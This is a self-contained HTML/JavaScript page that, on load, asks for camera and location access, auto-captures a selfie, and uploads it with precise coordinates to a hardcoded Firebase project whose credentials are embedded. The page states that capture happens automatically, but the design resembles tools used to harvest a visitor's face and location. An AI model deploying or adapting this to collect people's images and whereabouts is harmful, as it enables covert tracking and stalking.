<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Selfie & Location</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }

        h1 {
            color: #333;
            margin-bottom: 30px;
            text-align: center;
            font-size: 28px;
        }

        .status {
            background: #f0f4ff;
            border-left: 4px solid #667eea;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            font-size: 14px;
            color: #555;
        }

        .status.success {
            background: #f0fdf4;
            border-left-color: #22c55e;
            color: #166534;
        }

        .status.error {
            background: #fef2f2;
            border-left-color: #ef4444;
            color: #991b1b;
        }

        .status.loading {
            background: #fef3c7;
            border-left-color: #f59e0b;
            color: #92400e;
        }

        .info-box {
            background: #f9fafb;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #666;
            line-height: 1.6;
        }

        .info-box strong {
            color: #333;
            display: block;
            margin-bottom: 5px;
        }

        video {
            width: 100%;
            max-width: 300px;
            height: 300px;
            background: #000;
            border-radius: 10px;
            margin: 20px auto;
            display: block;
            object-fit: cover;
        }

        canvas {
            display: none;
        }

        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        button {
            flex: 1;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-secondary {
            background: #e5e7eb;
            color: #333;
        }

        .btn-secondary:hover {
            background: #d1d5db;
        }

        .progress {
            margin-top: 20px;
            display: none;
        }

        .progress.active {
            display: block;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e5e7eb;
            border-radius: 3px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .data-display {
            margin-top: 20px;
            padding: 15px;
            background: #f9fafb;
            border-radius: 8px;
            display: none;
        }

        .data-display.active {
            display: block;
        }

        .data-display p {
            margin: 8px 0;
            font-size: 13px;
            color: #555;
        }

        .data-display strong {
            color: #333;
        }

        .spinner {
            border: 3px solid #f3f4f6;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ“¸ Capture & Upload</h1>
        
        <div id="status" class="status loading">
            <span class="spinner"></span>Initializing...
        </div>

        <div class="info-box">
            <strong>How it works:</strong>
            This page will automatically capture your selfie and location when loaded. Your data will be securely uploaded to Firebase.
        </div>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>

        <div class="button-group">
            <button id="captureBtn" class="btn-primary" disabled>Capture Now</button>
            <button id="retryBtn" class="btn-secondary" style="display: none;">Retry</button>
        </div>

        <div id="progress" class="progress">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>

        <div id="dataDisplay" class="data-display">
            <p><strong>Latitude:</strong> <span id="latitude">-</span></p>
            <p><strong>Longitude:</strong> <span id="longitude">-</span></p>
            <p><strong>Timestamp:</strong> <span id="timestamp">-</span></p>
            <p><strong>Status:</strong> <span id="uploadStatus">-</span></p>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js"></script>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
            projectId: "esrat-4e28f",
            databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
            storageBucket: "esrat-4e28f.firebasestorage.app"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const storage = firebase.storage();

        // DOM Elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusEl = document.getElementById('status');
        const captureBtn = document.getElementById('captureBtn');
        const retryBtn = document.getElementById('retryBtn');
        const progressEl = document.getElementById('progress');
        const progressFill = progressEl.querySelector('.progress-fill');
        const dataDisplay = document.getElementById('dataDisplay');

        let stream = null;
        let latitude = null;
        let longitude = null;
        let cameraReady = false;
        let locationReady = false;

        // Update status message
        function updateStatus(message, type = 'loading') {
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
            if (type === 'loading') {
                statusEl.innerHTML = `<span class="spinner"></span>${message}`;
            }
        }

        // Start camera
        async function startCamera() {
            try {
                updateStatus('Requesting camera access...', 'loading');
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    cameraReady = true;
                    checkReadiness();
                };
            } catch (error) {
                updateStatus(`Camera Error: ${error.message}`, 'error');
                retryBtn.style.display = 'inline-block';
            }
        }

        // Get location
        async function getLocation() {
            try {
                updateStatus('Requesting location...', 'loading');
                return new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            latitude = position.coords.latitude;
                            longitude = position.coords.longitude;
                            locationReady = true;
                            document.getElementById('latitude').textContent = latitude.toFixed(6);
                            document.getElementById('longitude').textContent = longitude.toFixed(6);
                            checkReadiness();
                            resolve();
                        },
                        (error) => {
                            updateStatus(`Location Error: ${error.message}`, 'error');
                            retryBtn.style.display = 'inline-block';
                            reject(error);
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                });
            } catch (error) {
                updateStatus(`Location Error: ${error.message}`, 'error');
                retryBtn.style.display = 'inline-block';
            }
        }

        // Check if both camera and location are ready
        function checkReadiness() {
            if (cameraReady && locationReady) {
                updateStatus('âœ“ Ready to capture!', 'success');
                captureBtn.disabled = false;
                // Auto-capture after a short delay
                setTimeout(() => {
                    captureAndUpload();
                }, 1000);
            }
        }

        // Capture image from video
        function captureImage() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            return canvas.toDataURL('image/jpeg', 0.8);
        }

        // Upload to Firebase
        async function captureAndUpload() {
            if (!cameraReady || !locationReady) {
                updateStatus('Camera or location not ready', 'error');
                return;
            }

            try {
                captureBtn.disabled = true;
                updateStatus('Capturing image...', 'loading');
                progressEl.classList.add('active');

                // Capture image
                const imageData = captureImage();
                const timestamp = new Date().toISOString();
                const fileName = `selfies/${timestamp.replace(/[:.]/g, '-')}.jpg`;

                updateStatus('Uploading to Firebase...', 'loading');
                progressFill.style.width = '30%';

                // Convert base64 to blob
                const response = await fetch(imageData);
                const blob = await response.blob();

                // Upload to Storage
                const uploadTask = storage.ref(fileName).put(blob);

                uploadTask.on('state_changed',
                    (snapshot) => {
                        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                        progressFill.style.width = Math.min(progress, 90) + '%';
                    },
                    (error) => {
                        updateStatus(`Upload Error: ${error.message}`, 'error');
                        captureBtn.disabled = false;
                    },
                    async () => {
                        progressFill.style.width = '95%';
                        const downloadURL = await uploadTask.snapshot.ref.getDownloadURL();

                        // Save metadata to Database
                        const recordId = db.ref('captures').push().key;
                        await db.ref(`captures/${recordId}`).set({
                            latitude: latitude,
                            longitude: longitude,
                            timestamp: timestamp,
                            imageUrl: downloadURL,
                            fileName: fileName
                        });

                        progressFill.style.width = '100%';
                        updateStatus('âœ“ Successfully captured and uploaded!', 'success');
                        document.getElementById('uploadStatus').textContent = 'Uploaded successfully';
                        document.getElementById('timestamp').textContent = new Date(timestamp).toLocaleString();
                        dataDisplay.classList.add('active');

                        setTimeout(() => {
                            progressEl.classList.remove('active');
                            captureBtn.disabled = false;
                        }, 1500);
                    }
                );
            } catch (error) {
                updateStatus(`Error: ${error.message}`, 'error');
                captureBtn.disabled = false;
            }
        }

        // Retry button
        retryBtn.addEventListener('click', () => {
            location.reload();
        });

        // Capture button
        captureBtn.addEventListener('click', captureAndUpload);

        // Initialize on page load
        window.addEventListener('load', () => {
            startCamera();
            getLocation();
        });

        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
